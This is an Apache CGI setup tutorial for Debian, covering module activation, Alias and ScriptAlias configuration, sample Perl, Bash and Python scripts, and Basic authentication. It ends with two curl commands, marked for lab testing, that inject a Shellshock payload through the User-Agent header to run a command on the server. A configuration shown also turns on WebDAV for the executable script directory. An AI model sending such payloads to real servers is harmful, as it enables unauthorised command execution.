# CGI-Scripts(Common-Gateway-Interface)

CGI (Common Gateway Interface) is a standard protocol used to run external programs or scripts on a web server to generate dynamic web content. These scripts can be written in various languages like Python, Perl, PHP, or Shell, and are commonly used to deliver dynamic content based on user input.

## How CGI Works

- **Client Request:** A user accesses a CGI-enabled URL by clicking a link or submitting a form.
- **Server Execution:** The web server runs the CGI script located in the `cgi-bin` directory.
- **Dynamic Response:** The script processes any input and sends a dynamically generated HTML response to the client.

## Supported Technologies

CGI scripts can be written in several languages, including:

- Perl - Historically common for web scripting
- Python - Readable and easy to maintain
- PHP - Widely used for web development (though not strictly CGI)
- Ruby - Flexible and dynamic
- Shell Scripts - Useful for small utilities and server-side tasks

## Installation and Configuration Steps

### Install Apache and Perl CGI Module

```
apt update
apt install apache2
```

```
apt install libcgi-pm-perl perl
```

### Enable CGI Module

```
a2enmod cgi
```

### Verify CGI Module is Enabled in Apache

```
apache2ctl -M
```

```
apache2ctl -M | grep cgi
```

### Check AppArmor Status (Debian's security equivalent to SELinux)
```
aa-status
```

## Apache Configuration for CGI Support

### Verify CGI Module is Enabled
```
cgi_module (shared)
```

### Edit Apache Configuration
Edit the Apache config file:
```
vim /etc/apache2/conf-available/cgi-enabled.conf
```

Add this content:
```
<Directory "/usr/lib/cgi-bin">
    AllowOverride None
    Options +ExecCGI
    AddHandler cgi-script .cgi .pl .py .sh
    Require all granted
</Directory>
```

Enable the configuration:
```
a2enconf cgi-enabled
```

## Making Alias 
- If the scripts are located on some other location than `DocumentRoot(/var/www/html/rssite/)`
- For Example:
	- Html index page is in /var/www/html/rssite/
	- cgi scripts are in  /usr/lib/cgi-bin/rssite/
	- and if `DocumentRoot` is /var/www/html/rssite/
- So to access cgi scripts from  `http://rs.local/cgi-bin/test.cgi
- We must specify alias to resolve `rs.local/cgi-bin` to be resolved as `/usr/lib/cgi-bin/rssite/`

### 1) Using `Alias` + `Options +ExecCGI` (Controlled Mode)
```
<VirtualHost 192.168.1.28:443 >
    DocumentRoot /var/www/html/rssite/
    ServerName rs.local
    ServerAlias www.rs.local
    DirectoryIndex index.html

    <Directory /var/www/html/rssite/webdav/ >
        Dav on
    </Directory>

    Alias /cgi-bin/ "/usr/lib/cgi-bin/rssite/"
    <Directory "/usr/lib/cgi-bin/rssite/">
        Dav On
        Options +ExecCGI
        AddHandler cgi-script .cgi .py .pl .sh
    </Directory>

</VirtualHost>                    
```
- ✅ `Alias` is a normal mapping, does **not auto-enable CGI**, so you correctly added:
     - `Options +ExecCGI`
    - `AddHandler` for `.cgi`, `.py`, etc.

### 2) Using `ScriptAlias` (Auto-Executable Mode)
```
<VirtualHost 192.168.1.28:443 >
    DocumentRoot /var/www/html/rssite/
    ServerName rs.local
    ServerAlias www.rs.local
    DirectoryIndex index.html

    <Directory /var/www/html/rssite/webdav/ >
        Dav on
    </Directory>

    ScriptAlias /cgi-bin/ "/usr/lib/cgi-bin/rssite/"
    <Directory "/usr/lib/cgi-bin/rssite/">
        Dav On
    </Directory>
</VirtualHost>                    
```
- ✅ `ScriptAlias` means everything under `/cgi-bin/` URL will **automatically be treated as executable CGI**, no need for `+ExecCGI` or `AddHandler`.

## Creating and Deploying CGI Scripts

### Create a Simple CGI Script (Perl)

```
mkdir -p /usr/lib/cgi-bin
vim /usr/lib/cgi-bin/test.cgi
```

Set ownership and permissions:

```
chown www-data:www-data /usr/lib/cgi-bin/test.cgi
```

```
chmod 755 /usr/lib/cgi-bin/test.cgi
```

Restart Apache:
```
systemctl restart apache2.service
```

Access the script:
```
http://192.168.1.36/cgi-bin/test.cgi
```

## Sample CGI Scripts

### Perl: mem.cgi (Perl script showing memory usage)
```
#!/usr/bin/perl
print "Content-type: text/html\n\n";
print "<h1>Server Memory Usage</h1>";
print "<pre>";
exec("free -h");
print "</pre>";
```

### Shell: mem.cgi (Shell script showing memory usage)
```
#!/bin/bash
echo "Content-type: text/html"
echo
echo "<h1>Server Memory Usage</h1>"
echo "<pre>"
free -h
echo "</pre>"
```

### Shell: ping.cgi (Shell script ping 8.8.8.8)
```
#!/bin/bash
echo "Content-type: text/html"
echo
echo "Ping the Server"
ping -c 4 8.8.8.8
```

### Perl: Hello World (Perl script printing Hello World)
```
#!/usr/bin/perl
print "Content-type: text/html\n\n";
print "<html><head><title>CGI Script</title></head><body>";
print "<h1>Hello, World!</h1>";
print "Script filename: $0";
print "</body></html>";
```

### Python3: Hello World (Python3 script printing Hello World)
```
#!/usr/bin/python3
print("Content-type: text/html\n\n")
print("<html><head><title>CGI Script</title></head><body>")
print("<h1>Hello, CGI World!</h1>")
print("Script filename:", __file__)
print("</body></html>")
```

## Securing the cgi-bin Directory

### Restrict Access to Authenticated Users

Create a configuration file:
```
vim /etc/apache2/conf-available/cgi-auth.conf
```

Example secure block:
```
<Directory "/usr/lib/cgi-bin">
    AllowOverride None
    Options +ExecCGI
    AddHandler cgi-script .cgi .pl .py .sh
    
    AuthType Basic
    AuthName "Armour CGI"
    AuthUserFile /etc/apache2/htpasswd
    Require valid-user
</Directory>
```

Enable the configuration:
```
a2enconf cgi-auth
```

Create password file (if not already created):
```
htpasswd -c /etc/apache2/htpasswd user1
```

Restart Apache:
```
systemctl restart apache2.service
```

Access the script:
```
http://192.168.1.36/cgi-bin/test.cgi
```

### Test Bash Shellshock Vulnerability (Example for Lab Testing Only)
```
curl -H "User-Agent: () { foo; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://192.168.1.40/cgi-bin/test.cgi
```

```
curl -u user1:123 -H "User-Agent: () { foo; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://192.168.1.22/cgi-bin/test.cgi
```
